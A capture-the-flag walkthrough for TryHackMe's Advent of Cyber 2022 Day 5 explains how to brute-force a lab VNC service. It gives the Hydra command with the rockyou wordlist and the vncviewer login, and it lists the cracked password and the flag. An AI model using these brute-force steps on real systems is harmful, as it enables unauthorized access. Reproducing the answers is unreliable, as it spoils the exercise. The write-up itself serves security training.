# Advent of Cyber 2022 - Day 5: Brute-Forcing

{% embed url="https://tryhackme.com/room/adventofcyber4" %}

## Background
Network service brute-forcing using Hydra against Virtual Network Computing (VNC) running on TCP port 5900.

## Walkthrough
Run Hydra against the target VNC port using the supplied password wordlist:
```bash
hydra -P /usr/share/wordlists/rockyou.txt -s 5900 TARGET_IP vnc
```
Hydra successfully identifies the valid password: `1q2w3e4r`.
Connect to the target desktop using a VNC viewer:
```bash
vncviewer TARGET_IP:5900
```
Enter password `1q2w3e4r`. Upon establishing the graphical session, a flag is rendered directly on the victim's desktop background.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the VNC password discovered by Hydra? | `1q2w3e4r` |
| What is the flag written on the target's screen? | `THM{I_SEE_YOUR_SCREEN}` |
